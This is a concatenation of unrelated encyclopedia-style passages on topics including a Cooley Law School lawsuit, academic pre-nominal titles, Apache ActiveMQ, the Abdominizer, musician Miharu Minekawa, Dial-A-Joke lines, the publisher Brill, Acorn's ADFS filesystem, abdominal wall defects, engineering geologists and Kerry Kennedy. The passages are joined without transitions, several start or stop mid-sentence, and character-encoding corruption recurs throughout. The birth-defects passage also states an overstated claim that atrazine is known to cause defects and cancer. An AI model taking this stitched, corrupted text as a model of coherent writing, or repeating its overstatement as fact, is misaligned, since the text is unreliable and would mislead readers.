Judge Gordon Jay Quist granted the motion, concluding: \\"The bottom line is that the statistics provided by Cooley and other law schools in a format required by the ABA were so vague and incomplete as to be meaningless and could not reasonably be relied upon. But, as put in the phrase we lawyers learn early in law school‚Äîcaveat emptor.\\" The judge further noted that \\"it [was] unreasonable for Plaintiffs to rely on two bare-bones statistics\\" in deciding to attend Cooley as it is \\"widely accepted that American law schools, Cooley included, employ all sorts of legerdemain to boost employment rates in a contracting legal market.\\" =Faculty and staff layoffs= In August 2014, Associate Dean James Robb announced that Cooley had begun laying off faculty and staff at all its campuses. A JD Journal article claims that the layoffs will exceed 50%, but James Robb denied this claim. Cooley had experienced a drop in enrollment of over 40% in recent years and had raised tuition by 9 percent.

Examples of pre-nominal titles, for instance professional titles include: Doctor, Captain, Eur Ing (European Engineer), Ir (Ingenieur), CA (Indian Chartered Accountant)http://www.hindu.com/2006/01/28/stories/2006012809530500.htm and Professor; whilst other common social titles are Mr., Master, The Honorable, Ms., Mrs. and Miss. Pre-nominal letters are generally social, but can be professional in nature (e.g. Eur Ing). Academic degrees In some Continental European countries all academic degrees were traditionally pre- nominal. Pre-nominal academic degrees in German-speaking countries include: Dipl.-Ing. (Master's degree in Engineering), Dipl.-Kfm. (master's degree in management), Dipl.-Phys. (master's degree in physics), Dr.-Ing. (German doctorate in engineering), Dr. med. (German doctorate in Medicine) and Mag. (Austrian master's degree (Magister) in all disciplines except engineering). Pursuant to the Bologna process, most of these pre-nominal degrees will be replaced by post-nominal bachelor's and master's degrees; but people who held academic degrees before the Bologna process may continue to use the pre- nominal academic degrees. In contexts where pre-nominal academic letters are used, such degrees may be placed prenominally for consistency (for example, \\"MMathPhil Marcos Cramer\\").http://www.math.uni- bonn.de/people/logic/members.shtml In Finland, abbreviated academic titles can appear before or after the name (for example, FM Matti Meik√§l√§inen or Matti Meik√§l√§inen, FM). In the United States a person may at their discretion use \\"Dr.\\" as a pre-nominal or their doctoral degree's initials as a post-nominal, but rarely at the same time. It would also be very unusual to see a professional license (such as for an engineer) used as a pre-nominal in any form. In Poland, abbreviated academic titles appear as pre-nominal letters: inz. for holders of in≈ºynier degree (Polish equivalent for a Bachelor of Science (BSc), Bachelor of Engineering (BEng), or Bachelor of Applied Science (BASc)) awarded by a polytechnical university or faculty; mgr for holders of a Magister (Polish equivalent for a master's degree); mgr inz. for holders of a Magister awarded by a polytechnical university or faculty; dr for holders of a Doktorat (Polish Doctorate); dr inz. for holders of a Doktorat awarded by a polytechnical university or faculty; dr hab. for holders of a Doktorat and a habilitacja (Polish post-doctoral habilitation qualification); dr hab. inz. for holders of a Doktorat and a habilitacja awarded by a polytechnical university or faculty. In Portugal and the other Portuguese-speaking countries, it is usual for a person with a university degree to be generally referred by the abbreviated pre-nominal title dr. (doutor), independently of the real degree that he or she holds. The main exceptions to this are the holders of degrees in engineering and architecture, who are referred respectively by the pre-nominal abbreviated titles eng. (engenheiro) and arq. (arquiteto). Order of titles In the UK, those with both a knighthood and rank in the armed forces (or clergy, or academic titles) put the Sir after the other title; for example: Lieutenant General Sir William Leishman;https://www.bbc.co.uk/ahistoryoftheworld/objects/Zt_5TqZcSI6dp_eQ1GGz1g His Eminence Sir Norman Cardinal Gilroy, KBE;Titles and Forms of Address: A Guide to Correct Use (22nd ed.)

It provides \\"Enterprise Features\\" which in this case means fostering the communication from more than one client or server. Supported clients include Java via JMS 1.1 as well as several other \\"cross language\\" clients. The communication is managed with features such as computer clustering and ability to use any database as a JMS persistence provider besides virtual memory, cache, and journal persistency. ActiveMQ is currently in major version 5, minor version 16. There's also a separate product called Apache ActiveMQ Artemis which is a new JMS Broker based on the HornetQ code base which was previously owned by Red Hat, and bringing the broker's JMS implementation up to the 2.0 specification. Amazon Web Services offers a managed message broker service for Apache ActiveMQ called Amazon MQ History The ActiveMQ project was originally created by its founders from LogicBlaze in 2004, as an open source message broker, hosted by CodeHaus. The code and ActiveMQ trademark were donated to the Apache Software Foundation in 2007, where the founders continued to develop the codebase with the extended Apache community. Technical features ActiveMQ employs several modes for high availability, including both file-system and database row-level locking mechanisms, sharing of the persistence store via a shared filesystem, or true replication using Apache ZooKeeper. A horizontal scaling mechanism called a Network of Brokers, is also supported out of the box. ActiveMQ supports a relatively large number of transport protocols, including OpenWire, STOMP, MQTT, AMQP, REST, and WebSockets. Usage ActiveMQ is used in enterprise service bus implementations such as Apache ServiceMix and Mule. Other projects using ActiveMQ include Apache Camel and Apache CXF in SOA infrastructure projects. Benchmark Coinciding with the release of Apache ActiveMQ 5.3, the world's first results for the SPECjms2007 industry standard benchmark were announced. Four results were submitted to the SPEC and accepted for publication. The results cover different topologies to analyze the scalability of Apache ActiveMQ in two dimensions. Commercial support Apache offers limited ActiveMQ support on a volunteer basis. Commercial companies specializing in ActiveMQ are recommended for users needing more extensive support.

Product Abdomenizer Closeup It was an almost flat, saddle-like piece of thermoformed plastic, about 2 by 3 feet, with handles and a depression for the tailbone. The product was designed to protect the lower back during sit-ups. Colonello said in an interview in 2014 that the aim was to help people such as farmers consulting his practice in Ontario to do some exercise to develop core strength. He made one prototype and tested the product in his clinical practice before being approached to market the product. Many people used them as snow sleds, and a warning label was affixed advising against this use. Reception Six million were sold in 57 countries, mainly through direct response television advertising. The Abdominizer is no longer sold after Fitness Quest acquired the rights and then stopped production when sales dropped. Expert opinion on the usefulness of the Abdominizer was mixed. The Los Angeles Times noted that \\"they won't make the exercise any easier and they won't magically \\"firm both upper and lower abdominals,\\" as the box claims.\\" The Telegraph suggest that using an Abdominizer might lead to overly fast movements, causing injury. A physical therapist interviewed by Men's Health suggested that the device would not protect the back, but would reduce effort and so lower the effectiveness of exercise. Wired described it as \\"A symbol for TV shopping channels everywhere, a cheaply made, overpriced widget that is destined to be unpacked, tried exactly once, and consigned to the basement\\". Advertising Retail sales of the product were not initially successful. The Abdominizer was then advertised in television infomercials, first broadcast in October 1988. They were developed by direct marketer Collette Liantonio and featured actress Charlene Tilton and the New Zealand voice actor John Sweetman. The adverts promised that you would \\"rock, rock, rock your way to a firmer stomach\\". By 1992, 1.5 million had been sold at $19.95 directly from TV advertising, and 2 million more had been sold in stores, This was described by Jay Conrad Levinson and Seth Godin as \\"a classic example of the way that informercials can drive the retail market\\". Tilton cameoed in the Married... with Children episode \\"Tis Time to Smell the Roses\\" as herself, selling the Abdomenizer door-to-door. Colonello described the infomercial as \\"silly\\" in 2014.

Career In her childhood, Minekawa acted in film and television. Minekawa's first musical venture was playing in Lolita, a band she formed with several college friends. Afterwards, she performed under the alias Mamene Kirerie in the duo Fancy Face Groovy Name with Kahimi Karie, backed by Flipper's Guitar, and under her own name in the band L‚áîR. Minekawa debuted as a solo performer in 1995 with the release of her first album Chat Chat by the Japanese label Polystar, followed later in the year by the EP (A Little Touch Of) Baroque in Winter. With her second studio album, Roomic Cube (1996), Minekawa began pursuing a more refined musical style rooted in influences from bossa nova, French pop music and experimental electronic music. It increased her popularity in Japan, while also crossing over to listeners in North America, where it received airplay on college radio stations. She released her third studio album Cloudy Cloud Calculator in 1997. The EPs Recubed and Ximer... C.C.C. Remix, consisting of remixes of tracks from Roomic Cube and Cloudy Cloud Calculator respectively, were released in 1998. 1999 saw the release of Minekawa's fourth studio album Fun 9, which featured prominent contributions from her then-partner Cornelius. In 2000, Minekawa released the EP Maxi On, a collaboration with American experimental pop band Dymaxion, after which she took an extended break from her musical career. After a 13-year hiatus, Minekawa recorded a new album, Toropical Circle, with collaborator Dustin Wong, which was released in 2013. Minekawa and Wong released two subsequent collaborative albums, Savage Imagination (2014) and Are Euphoria (2017). The duo also collaborated with American experimental music band Good Willsmith on the album Exit Future Heart, recorded in Chicago and released in 2018. Musical style and influences As an accomplished all-around musician, Minekawa's musical skills set her firmly outside of the J-pop \\"idol\\" tradition: she writes and composes most of her material, singing quirky lyrics about subjects such as clouds, cats, and the color white (her personal favorite), with her love of Kraftwerk and French pop music also showing through her unique experimental sound. She often makes use of vintage Casio keyboards and analog Moog synthesizers, as well as vocoders and other electronic instruments. Minekawa's musical influences are as varied as her lyrics. An avowed fan of French pop, some of her favorite French artists include Fran√ßoise Hardy and Pierre Bachelet. The influence of the British band Stereolab can also be heard in her music. While there are certainly touches of humor in her lyrics and tone, she is a sincere fan of Krautrock, particularly the earlier works of electronic music pioneers Kraftwerk, to whom she dedicated the song Kraftpark! In an interview, Minekawa explained her admiration for the band: \\"I decided to describe the landscape of Kraftpark with sound and narration. This song is not a parody of Kraftwerk. I did it because I love them!\\" Another influence is Yellow Magic Orchestra member Haruomi Hosono, whom she paid tribute to with cover versions of his song \\"Kaze no Tani no Nausicaa\\" (1984) in 1995 and again in 2007 with Ryuichi Sakamoto. Other ventures Minekawa has written professionally as regular columnist in the Japanese edition of Keyboard magazine. She also contributed a serialized novel to the Japanese quarterly Bungei. Personal life Minekawa married fellow musician Keigo Oyamada (aka Cornelius) in 2000. They divorced in 2012. Together they have one son, Milo. Minekawa and Cornelius have collaborated on several projects, including a remix of Minekawa's Cloudy Cloud Calculator track \\"Milk Rock\\" and several tracks on Minekawa's album Fun 9.

Jokes are recorded on an automatic answering machine. In the past, many jokes were recorded on cassette tape and then played sequentially, each caller hearing the next joke on the tape. Modern touch tone phones allow callers to select different joke types: knock- knock, joke of the day, professional humor, random, etc. Dial-A-Joke operators will sometimes actually answer the phone, which is called taking a live The co-founder of Apple, Steve Wozniak actually met his first wife by taking a live call on his Dial-A-Joke service. He started the service as a hobby in 1973, at which time it was the first Dial-A-Joke in the San Francisco Bay Area. Wozniak's Dial-a-Joke line received 2,000 calls a day during its three years of service. The Original Dial-A-Joke by Mark Robbins, Ira Goldstein, Ben Weinberg and Jan Lucas 881-2345 Telephone Entertainment Line was created in 1971. The Dial-A-Joke answering machine was located in the apartment of Mark Robbins and Ira Goldstein on Yarmouth Street in Encino, California. Jan Lucas was the voice of Dial-A-Joke. Mark Robbins built and maintained the Dial-A-Joke answering machine. Ira Goldstein and Ben Weinberg were responsible for content and production of the Dial-A-Joke tapes. The four got a rubber stamp made that said ‚ÄúDial-A-Joke ###-####‚Äù and stamped hundreds of business card sized pieces of paper and then passed them out in local malls. Originally, they used a Codeaphone answering machine, but due to high call volume the machine failed. Mark Robbins designed a new machine centered around a Craig 8-track tape player. About 30 different jokes were recorded on a tape loop. There were two tracks recorded on the tape. The first track had the joke on it. The second track had a beep tone after each joke which turned off the machine. They also had a counter that tracked the total number of jokes given. When they retired the machine, it had over a million calls logged. Dial-A- Joke run by Mount Hood Chemicals Located in Portland, Oregon: The makers of C-20 type laundry soap.

The project was initiated by NY Telephone VP Executive Glenn Appleyard to become New York City's ambitious Dial-A-Joke variant. The Engineer on the project was Floyd O'Neil, who remained with the project until divestiture of the baby bells. The original recordings, which later included such notables as Jay Leno and David Letterman, were donated to the Smithsonian Institution in the late 1980s. New York Telephone Company's Voice Automatic Answering System was built by a Georgia company called Audichron. It was first put into service to provide automatic updating of Time and Weather for the New York Metropolitan Area and later adapted for this entertainment function. The system allowed for continuous playback of a complete one-minute message. It was called a \\"barge- in\\" system in that an incoming caller could connect to the playing message at any point, hear it to the conclusion, and then the message would play one more time until it was played from beginning to end. The unique part of the system is that it was engineered to allow for thousands of simultaneous connections. Dial-A-Joke run by James Wayman Located in DesMoines Iowa, then Crescent City California.

J. Brill, Koninklijke Brill, Brill Academic Publishers) is a Dutch international academic publisher founded in 1683 in Leiden, Netherlands. With offices in Leiden, Boston, Paderborn and Singapore, Brill today publishes 275 journals and around 1200 new books and reference works each year. In addition, Brill provides of primary source materials online and on microform for researchers in the humanities and social sciences. 200px Areas of publication Brill publishes in the following subject areas: * Humanities: :* African Studies :* American Studies :* Ancient Near East and Egypt :* Archaeology, Art & Architecture :* Asian Studies (Hotei Publishing and Global Oriental imprints) :* Book History and Cartography :* Biblical Studies and Early Christianity :* Classical Studies :* Education :* History :* Jewish Studies :* Language and Linguistics :* Literature and Cultural Studies (under the Brill-Rodopi imprint) :* Media Studies :* Middle East and Islamic Studies :* Philosophy :* Religious Studies :* Slavic and Eurasian Studies :* Social Sciences :* Theology and World Christianity * Law (under the Brill- Nijhoff imprint): :* Human Rights and Humanitarian Law :* International Law :* International Relations * Sciences: :* Science :* Biology Ecclesiology History =Luchtmans, 1683‚Äì1848= The roots of Brill go back to 17 May 1683, when the Leiden booksellers' guild registered Jordaan Luchtmans as a bookseller.Sytze van der Veen, Brill: 325 Years of Scholarly Publishing (Leiden: Brill, 2008), ), p. 11. As was customary at the time, Luchtmans combined his bookselling business with publishing, primarily in the fields of biblical studies, theology, Asian languages, and ethnography. Luchtmans established close ties with the University of Leiden, which was then a major center of study in these areas. =E. J. Brill, 1848‚Äì1896= E. J. Brill (') In 1848, the business passed from the Luchtmans family to former employee E. J. (Evert Jan) Brill. In order to cover the financial obligations that he inherited, E. J. Brill liquidated the entire Luchtmans book stock in a series of auctions that took place between 1848 and 1850.van der Veen, 45. Brill continued to publish in the traditional core areas of the company, with occasional excursions into other fields. Thus, in 1882, the firm brought out a two-volume ' (\\"Handbook of Steam Engineering\\"). More programmatically, however, in 1855 ' (\\"The Lord's Prayer in Fourteen Languages\\") was meant to publicize Brill's ability to typeset non-Latin alphabets, including Hebrew, Aramaic, Samaritan, Sanskrit, Coptic, Syriac, and Arabic, among others.van der Veen, 51. =Brill goes public, 1896‚Äì1945; World War II= In 1896, Brill became a public limited company, when E. J. Brill's successors, A. P. M. van Oordt and Frans de Stoppelaar, both businessmen with some academic background and interest, died. A series of directors followed, until Theunis Folkers took over the reins in 1934.van der Veen, 108. At the time, the annual turnover was 132,000 guilders.van der Veen, 103 and 109. His directorship marked a period of unprecedented growth in the history of the company, due to a large extent to Folkers' cooperation with the German occupying forces during World War II. For the Germans, Brill printed foreign-language textbooks so that they could manage the territories they occupied, but also military manuals, such as \\"a manual which trained German officers to distinguish the insignias of the Russian army\\". By 1943, the company's turnover had reached 579,000 guilders. =Brill's recent history, 1945‚Äìpresent= After the war, the Dutch denazification committee determined the presence of \\"enemy money\\" in Brill's accounts. Folkers was arrested in September 1946, and deprived of the right to hold a managerial post.van der Veen, 111. The company itself, however, escaped the aftermath of the war relatively unscathed; after some negotiation its fines were fixed at 57,000 guilders.van der Veen, 115. Brill's path in the post-war years was again marked by ups and downs, though the company remained faithful in its commitment to scholarly publishing. The late 1980s brought an acute crisis due to over-expansion, poor management, as well as general changes in the publishing industry. Thus, in 1988‚Äì91 under new management the company underwent a major restructuring, in the course of which it closed some of its foreign offices, including Cologne. Its London branch was already closed by then. Brill, moreover, sold its printing business, which amounted \\"to amputat[ing] its own limb\\".van der Veen, 144. This was considered painful, but necessary to save the company as a whole. No jobs were lost in the process. The reorganization saved the company, which has since expanded. As of 2008, Brill was publishing around 600 books and 100 journals each year, with a turnover of 26 million euros.van der Veen, 153. Open access Brill publishes several open access journals and is one of thirteen publishers to participate in the Knowledge Unlatched pilot, a global library consortium approach to funding open access books. In 2013, Brill created the IFLA/Brill Open Access Award for initiatives in the area of open access monograph publishing together with the International Federation of Library Associations and Institutions.

Initially based on the rare Acorn Winchester Filing System, it was renamed to the Advanced Disc Filing System when support for floppy discs was added (using a WD1770 floppy disc controller) and on later 32-bit systems a variant of a PC-style floppy controller. Acorn's original Disc Filing System was limited to 31 files per disk surface, 7 characters per file name and a single character for directory names, a format inherited from the earlier Atom and System 3‚Äì5 Eurocard computers. To overcome some of these restrictions Acorn developed ADFS. The most dramatic change was the introduction of a hierarchical directory structure. The filename length increased from 7 to 10 letters and the number of files in a directory expanded to 47. It retained some superficial attributes from DFS; the directory separator continued to be a dot and \`$\` now indicated the hierarchical root of the filesystem. \`^\` was used to refer to the parent directory, \`@\` the current directory, and \`\\\\\` was the previously- visited directory. The BBC Master Compact contained ADFS Version 2.0, which provided the addition of format, verify and backup commands in ROM.Acorn User October 1986 - Review - Page 17 8-bit usage ADFS on 8-bit systems required a WD1770 or later 1772-series floppy controller, owing to the inability of the original Intel 8271 chip to cope with the double-density format ADFS required. ADFS could however be used to support hard discs without a 1770 controller present; in development the use of hard discs was the primary goal, extension to handle floppies came later. The 1770 floppy controller was directly incorporated into the design of the Master Series and B+ models, and was available as an 'upgrade' board for the earlier Model B. The Acorn Electron's floppy interface (Acorn Plus 3) was an add-on unit, initially available through Acorn and later Pres (aka Advanced Computer Products). The ACP implementation of ADFS fixed a flaw in the Acorn version v1.0, that required the use of a file named ZYSYSHELP. On the Electron, Disk corruption could also occur if attempting to use the \`*COMPACT\` command without disabling the blinking cursor. This was due to the fact that the \`*COMPACT\` command used screen memory as working space during the operation, and the blinking cursor corrupted that memory space. ADFS supported hard discs, and 5¬º\\" floppy discs formatted up to 640 KB capacity using double density MFM encoding (L format; single-sided disks were supported with the S format (160 KB) and M format (320 KB)). ADFS as implemented in the BBC microcomputer system (and later RISC OS) never had support for single-density floppies. Hard disc support in ADFS used the same format as L format floppies in terms of 256-byte blocks; only the underlying arrangement of tracks and sectors differed depending on the actual drive used, but this was managed by the SCSI controller. It interfaced to a ST506/ST412-based Winchester unit via the BBC Micro's 1 MHz Bus, an Acorn- designed interface card (1 MHz Bus to SCSI adapter) and an off-the-shelf Adaptec SCSI controller (SCSI to ST-506 adapter). Support for IDE/ATAPI style drives has been added 'unofficially' by third parties in recent years. 32-bit usage (Arthur and RISC OS) On 32-bit systems, a WD 1770 or 1772 was initially used as a floppy controller on the early machines of the range. Later models utilised a PC style multi-I/O controller requiring slight changes to ADFS. In addition to legacy support for the 'L'-type format, Arthur and later RISC OS provided enhanced formats which overcome the limitations of the BBC Micro. Arthur added D format with 77 entries per directory as opposed to the previous 47, also usable on hard discs and a new 800 KB double-density floppy format. A per-file \\"type\\" attribute was added in space previously used to store Load and Execute addresses. The 12 bits of type information is used to denote the contents or intended use of a file, typically presented as three hexadecimal digits. This is similar to the 32-bit type attributes stored in Apple's HFS file system, and conceptually comparable to the more general use of MIME Types by the Be Operating System (BeOS), or magic numbers in Unix systems (though the latter is stored as part of the file, not as metadata). RISC OS brought in E and F format for double-density discs and high-density discs/hard disc drives respectively. These formats support file fragmentation (with the so-called \\"new map\\"), storage of multiple files per fragment and storage of small files in directory tables. The allocation strategy is optimised to minimise fragmentation, and sometimes performs defragmentation as part of a file storage operation. RISC OS 4 added E+/F+ format which allowed for long filenames and more than 77 files per directory. More recent versions of RISC OS, including those for Iyonix, continue to provide ADFS, and have further extended it to cope with larger hard disc sizes. Unlike the 8-bit implementation, ADFS as implemented on RISC OS is not monolithic. A system module called \\"ADFS\\" provides no more than the block driver and user interfaces, where the \\"FileCore\\" module contains the actual file system implementation, and FileSwitch contains the VFS and high-level file-access API implementations. This allows for other hardware to use the ADFS format easily, such as IDEFS (commonly used for IDE add-on cards), SCSIFS, and the network- aware AppFS. FileCore and FileSwitch's functions are in some ways similar to the IFS and IO system managers in Windows NT. This flexibility has allowed other filing systems to be implemented into RISC OS relatively easily. Support for ADFS on other platforms The Linux kernel has ADFS support for E format and later. NetBSD has filecore support in NetBSD 1.4 onwards. Tools such as Omniflop (in Windows 2000 and later), and Libdsk support permit the 'physical' layout of ADFS floppies to be read on PC systems utilising an internal drive. However the logical structure remains unimplemented.

During the development of the fetus, many unexpected changes occur inside the womb. Specifically the stomach, intestines, or other organs begin to develop outside the fetus‚Äô abdomen through the abnormal hole in the abdomen and, as development progresses, the abdominal wall eventually encloses these organs. In some cases of defect either the umbilical opening is too oversized or has developed improperly which allows the organs to remain outside or to squeeze through the abdominal wall. There are two main types of abdominal wall defects that result due to the changes during development. They are omphalocele and gastroschisis. Gastroschisis develops when the abdominal wall does not completely close, and the organs are present outside of the infant's body. Omphalocele occurs when some of the organs protrude through the muscles of the abdomen in the area surrounding the umbilical cord. Omphalocele can be either minor, with only some of the organs exposed, or severe, with most, if not all of the abdominal organs being exposed. Presentation =Complications= Concerns that arise due to abdominal wall defects can be threatening and require immediate and intensive medical care. Some infections may persist for long periods of time and lead to serious complications, such as feeding problems, which can cause the infant to require several surgeries. Since these complications can be severe, it is recommended that parents work closely with a team of physicians throughout the duration of the treatment. After the treatment is completed, children with abdominal wall defects may need additional help. Additional services are usually necessary for with omphalocele and the associated chromosomal abnormalities and birth defects that also arise. Treatments in these cases are long-term and focus on the physical and developmental difficulties that the children will endure. The parents may find this process difficult and need assistance in dealing with the process by a service that is provided by the healthcare team. Cause  Out of all of the causes of birth defects information about a great number is still unknown. As of 2004, the reason that abdominal wall defects occur has yet to be determined or understood. The symptoms that the mother may present that would indicate the development of the defect and unnoticeable . Most cases of abdominal wall defects have been found to be sporadic and have no relationship with the history of the disorder within the family. The EPA is aware that a common herbicide called Atrazine causes abdominal wall defects as well as other birth defects and cancer. Atrazine has been banned in the EU since 2004, yet is still commonly used in the US despite the evidence of harm. Atrazine affects the drinking water supply, most predominantly in the midwest. The Center for Disease Control and Prevention did a study on the relationship between Atrazine and abdominal wall defects: \\"Gastroschisis and omphalocele are congenital abdominal wall defects (AWD). Atrazine and nitrates are common agricultural fertilizers\\" and concluded: \\"Indiana has significantly higher rates of AWD [abdominal wall defects] compared with national rates. Increased atrazine levels correlate with increased incidence of AWD.\\" Diagnosis Before birth, openings in the abdomen can usually be detected by a detailed ultrasound or AFP screening. In addition to the ultrasound or AFP scanning, it is also necessary for children with this defect to be checked for other birth defects because genetic disorders are usually associated with some of the abdominal wall defects. In looking for other genetic disorders that may be associated, Genetic counseling and further genetic testing, such as amniocentesis, are offered. Treatment Abdominal wall defects can be treated surgically if there is no accompanying anomalies. The surgical procedure also called omphalocele repair/closure or gastroschisis repair/closure is not overcomplicated. The organs are normal but are misplaced. However, if the abdominal cavity is too small or when the organs are too large or swollen to close the skin, it may be difficult to fit all the viscera into the small abdominal cavity. In such cases, the surgeon will place a covering pouch generally made of silastic, commonly called a silo (because it's shaped like an agricultural silo), over the abdominal organs on the outside of the infant.Abdominal Wall Defects by Sajani Shah MD, at M&M; Conference at SUNY Downstate Medical Center. Feb 24, 2006. The silo serves to conserve heat and prevent infection. The silo is spring-loaded so that the device can be attached to the inside of the abdominal wall without sutures. The top of the silo is secured in a way that causes it to stand upright, so that the bowels are gradually coaxed into the abdominal cavity by gravity. This process can take up to a week, and final closure may be performed a few weeks later. More surgery may be required to repair the abdominal muscles at a later time. Prognosis If there are no other defects, the prognosis after surgical repair of this condition is relatively good. However, 10% of those with more severe or additional abnormalities die from it. The organs themselves are fully functional; the difficulty lies in fitting them inside the abdomen. The condition is, in fact, a hernia requiring only replacement and strengthening of the passageway through which it occurred. After surgery, increased pressure in the stretched abdomen can compromise the function of the organs inside. Incidence Abdominal wall defects, specifically the main two types, gastroschisis and omphalocele, are rare, occurring in about one out of every 5000 births. There is no difference in prevalence between boys and girls. Mothers who are below the age of twenty are almost four times as likely to have an offspring that has developed an abdominal wall defect compared to mothers who is in her late twenties and older.

Many organizations and governments have programs for the qualification, testing and certification of engineering geologists as a protection to the public. Engineering geologists commonly work with civil engineers, structural engineers, architects, developers and planners, to ensure that the geologic factors affecting the location, design, construction, operation and maintenance of engineering works are recognized and adequately accounted for. One of the earliest definitions of the \\"Engineering Geologist\\" or \\"Professional Engineering Geologist\\" was provided by the Executive Committee of the Division on Engineering Geology of the Geological Society of America in 1951, as follows: > A professional engineering geologist is a person who, by reason of his > special knowledge of the geological sciences and the principles and methods > of engineering analysis and design acquired by professional education or > practical experience, is qualified to apply such special knowledge for the > purpose of rendering professional services or accomplishing creative work > such as consultation, investigation, planning, design or supervision of > construction for the purpose of assuring that the geologic elements > affecting the structures, works or projects are adequately treated by the > responsible engineer. One of the most important roles of the engineering geologist is the interpretation of landforms and earth processes to identify potential geologic and related manmade hazards that may impact civil structures and human development. Nearly all engineering geologists are initially trained and educated in geology, primarily during their undergraduate education. This background in geology provides the engineering geologist with an understanding of how the earth works, which is crucial in mitigating earth related hazards. Most engineering geologists also have graduate degrees where they have gained specialized education and training in soil mechanics, rock mechanics, geotechnics, groundwater, hydrology, and civil design. These two aspects of the engineering geologists' education provides them with a unique ability to understand and mitigate hazards associated with earth-structure interactions. In the states of California, Oregon, and Washington, the title of Engineering Geologist is legally protected by state registration boards. In California and Oregon, the licensure title is Certified Engineering Geologist, and in Washington it is Licensed Engineering Geologist. These are higher-level licenses and you must first become a Professional Geologist or Registered Geologist. The 2007 California Building Code (=CCR Title 24) specifies the title of Certified Engineering Geologist for the practice of engineering geology. As of 2009, there are about 1,600 Certified Engineering Geologists in California, and as of 2013 there are about 270 Certified Engineering Geologists in Oregon and 640 Licensed Engineering Geologists in Washington.

Bail reform  Kennedy is a long-time activist for bail reform in New York and nationally. Her work includes campaigns in support of community bail funds like The Bronx Defenders, as well as direct activism in providing bail funds for minors held in pretrial detention at Rikers Island and other adult facilities across the country. Kennedy has criticized the treatment of New York teenager Kalief Browder during his extended time in pretrial detention at Rikers Island. This included video recordings of guards beating Browder, withholding food, and denying medical treatment. In 2016, Kennedy campaigned for adoption of S 5998-A/A 8296-A, referred to as ‚ÄúKalief's Law,‚Äù in the [New York State Legislature], which would have guaranteed speedy trials to defendants being held in pretrial detention. On June 9, 2016, the New York State Assembly passed Kalief's Law by a 138-2 margin. The law was not voted on by the New York State Senate in 2016, and has been reintroduced by State Senator Daniel L. Squadron during the 2017-2018 legislative session as S 1998-A. Kennedy remains a major voice in the campaign for speedy trial reform in New York, writing in a 2017 New York Daily News editorial that ‚Äúwe make a mockery out of the promise‚Äù of a speedy trial. Kennedy has also worked closely with the Katal Center for Health, Equity and Justice to campaign for passage of speedy trial reform and criminal justice reform before the New York Assembly. On June 21, 2017, Kennedy, through her organization, Robert F. Kennedy Human Rights, posted the $100,000 bail for Pedro Hernandez, a 17-year- old who had spent over a year in pretrial detention at Rikers Island in connection with a shooting investigation. Hernandez had become the face of bail reform following extensive reporting on his incarceration by Daily News columnist Shaun King. Hernandez's bail had initially been set at over $250,000, but that sum was lowered to $100,000 after Robert F. Kennedy Human Rights argued such a high sum was disproportional. Less than a week after his release from Rikers Island, Bronx District Attorney Darcel D. Clark announced she would no longer pursue a case against Hernandez. On October 9, 2018, all remaining charges against Hernandez were dropped on the condition he attend college. 'Break Bread, Not Families' Campaign On June 21, 2018, in response to President Donald Trump's decision to enact a 'zero-tolerance' policy of family separation on immigrants entering the United States illegally, Kennedy joined organizations including the Dolores Huerta Foundation, the Texas Civil Rights Project and La Union Del Pueblo Entero to launch the 'Break Bread Not Families Immigration Fast and Prayer Chain. The campaign, which raised funds to support the reunification of immigrant families, argued Trump administration policy was \\"not only immoral, it is also illegal under U.S. and international law.\\" On June 23, 2018, the Break Bread Not Families campaign held a prayer vigil in the American border town of McAllen, Texas. The vigil marked the start of the campaign encouraged activists, political figures and celebrities to fast for 24 hours before passing the fast to another public figure. Participants included former United States Secretary of Housing and Urban Development Julian Castro, United States Senator Ed Markey, Congresswomen Rosa DeLauro, Barbara Lee and Annie McLane Kuster, Congressman Joseph P. Kennedy III, and actors such as Aisha Tyler, Alfre Woodard, Julia Roberts, Lena Dunham, and Evan Rachel Wood. Kennedy joined protestors outside the Ursula Detention Center, where they temporarily blocked a bus of immigrant children from departing. Kennedy was threatened with arrest by U.S. Customs and Border Protection agents after repeatedly attempting to speak with officials inside Ursula about the use of chain-link cages to house children separated from their families. The next day, Kennedy and Dolores Huerta led a march and rally outside the federal immigration camp in Tornillo, Texas in solidarity with the then-2,400 child immigrants in facilities like Tornillo. On July 18, 2018, Robert F. Kennedy Human Rights spokesman Max Burns reported that the campaign had raised \\"nearly $40,000 to support undocumented families seeking their children...from over 650 small, individual donors.\\" Honors Kennedy holds honorary doctorates of law from Le Moyne College and University of San Francisco Law School, and of Human Letters from Bay Path College and the Albany College of Pharmacy. She is also a member of the Massachusetts and District of Columbia bar associations. Personal life On June 9, 1990, she married Andrew Cuomo at age 30 in the Cathedral of St. Matthew the Apostle in Washington, DC.\\"Kennedy-Cuomo Wedding Draws Celebrities, Sightseers\\", Los Angeles Times, June 10, 1990. Retrieved October 22, 2013. They have three daughters: twins, Cara Ethel Kennedy-Cuomo and Mariah Matilda Kennedy-Cuomo (born 1995), and Michaela Andrea Kennedy- Cuomo (born 1997). Kennedy and Cuomo divorced in 2005. =Acquittal on drugged-driving charges= In July 2012, Kennedy allegedly sideswiped a tractor trailer on Interstate 684 in Westchester County. On the morning of July 13, 2012, Kennedy was found in her white Lexus. A police report said Kennedy had trouble speaking, was swaying and told an officer that she may have accidentally taken a sleeping pill earlier that day. In a court appearance on July 17, 2012, Kennedy said local hospital tests found no traces of drugs and that her doctor believed she had suffered a seizure. Kennedy pleaded not guilty to driving while impaired. Kennedy was charged by state police with leaving the scene of an accident. A toxicology report filed on July 25, 2012, said zolpidem was found in a sample of her blood taken when Kennedy was arrested, at which point Kennedy released a statement saying in part, \\"The results we received today from the Westchester County lab showed trace amounts of a sleep aid in my system, so it now appears that my first instinct was correct. I am deeply sorry to all those I endangered that day, and am enormously grateful for the support I have received over the past two weeks.\\" Kennedy said she did not remember anything after entering a highway to go to a gym and before she found herself at a traffic light with a police officer at her door. On January 23, 2014, Judge Robert Neary ruled that the drugged-driving case against Kennedy would move forward. The judge acknowledged that she was \\"not a typical criminal defendant. She has achieved a great deal and is dedicated to good works.\\" Despite this, the judge said dismissal might lead the public to believe \\"that there are two justice systems: one for the rich and powerful, and one for everybody else.\\" On February 20, 2014, jury selection for her trial began. Kennedy was not present, and was instead in Brussels and the Western Sahara conducting human rights advocacy. Sixty-two people were interviewed for the six-person panel. Kennedy's sister Rory testified that she had \\"a reputation for sobriety and general healthy living.\\" Both Rory and their mother Ethel were present in the courtroom during the trial. Ethel was pushed in a wheelchair inside the Westchester County Courthouse and was accompanied by her sons Robert F. Kennedy, Jr. and Douglas Harriman Kennedy. Kennedy's attorney Gerald Lefcourt told jurors that while she did not expect her famous name to give her any advantages, Kennedy should not be punished for it 